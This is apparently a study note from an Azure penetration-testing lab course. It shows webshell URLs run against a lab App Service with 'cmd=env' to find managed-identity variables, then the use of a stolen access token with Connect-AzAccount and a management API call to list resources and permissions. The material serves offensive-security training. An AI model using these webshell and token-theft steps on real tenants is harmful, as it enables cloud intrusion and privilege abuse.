# Azure App Service

- [Azure App Service](#azure-app-service)
  - [Azure App Service](#azure-app-service-1)
  - [Initial Access - App Service Abuse](#initial-access---app-service-abuse)
  - [Initial Access - App Service Abuse - Insecure File Upload](#initial-access---app-service-abuse---insecure-file-upload)

---

## Azure App Service

![picture 26](images/5a1badb5229e8abb0553df095aca19a0d502322dc54c5613da6d7ea0e60d529b.png)  

*"Azure App Service is an HTTP-based service for hosting web applications, REST APIs, and mobile back ends."*

It supports both Windows and Linux environments.

For lanaguages, .NET, .NET Core, Java, Ruby, Node.js, PHP, or Python are supported.

Each app runs inside a sandbox but isolation depends upon App Service plans:

- Apps in Free and Shared tiers run on shared VMs
- Apps in Standard and Premium tiers run on dedicated VMs

<br/>

Windows apps (not running in Windows containers) have local drives, UNC shares, outbound network connectivity (unless restricted), read access to Registry and event logs. In the above case, it is also possible to run a PowerShell script and command shell. But the privileges will be of a the **low-privileges** workers process that uses a random application pool identity.

<br/>

---

## Initial Access - App Service Abuse

While there are default security features available with App Service (sandboxing/isolation, encrypted communication etc.), vulnerabilities in the code deployed are abusable. The classic web app vulnerabilities like SQL Injection, Insecure file upload, Injection attacks etc. do not disappear magically :)

Here we will use:

- Insecure File Upload
- Server-side Template Injection
- OS Command Injection

<br/>

---

## Initial Access - App Service Abuse - Insecure File Upload

By abusing an insecure file upload vulnerability in an app service, it is possible to get command execution. 

As discussed previously, the privileges will be of the low-privilege worker process. But **if the app service uses a Managed Identity**, we may have the ability to have interesting permissions on other Azure resources.

<br/>

After compromising an app service, we can request access tokens for the managed identity. If the app service contains environment variables `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.

- http://defcorphqcareer.azurewebsites.net/uploads/student190shell.phtml?cmd=env

<br/>

Get the access token for the managed identity using another webshell:

- https://defcorphqcareer.azurewebsites.net/uploads/student190token.phtml

<br/>

Note:
You can find both of the above web shells in the Tools directory.

<br/>

Check the resources available to the managed identity (using the access token and client ID):

```
$token = 'eyJ0eX...'
Connect-AzAccount -AccessToken $token -AccountId <clientID>
Get-AzResource
```

<br/>

Check the permissions of the managed identity on the virtual machine from above:

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

Note: 
There should be no need to use the above code. `Get-AZRoleAssignment` gives the correct result in case a user's token is used. But throws an error in case token of a manage identity is used.

<br/>

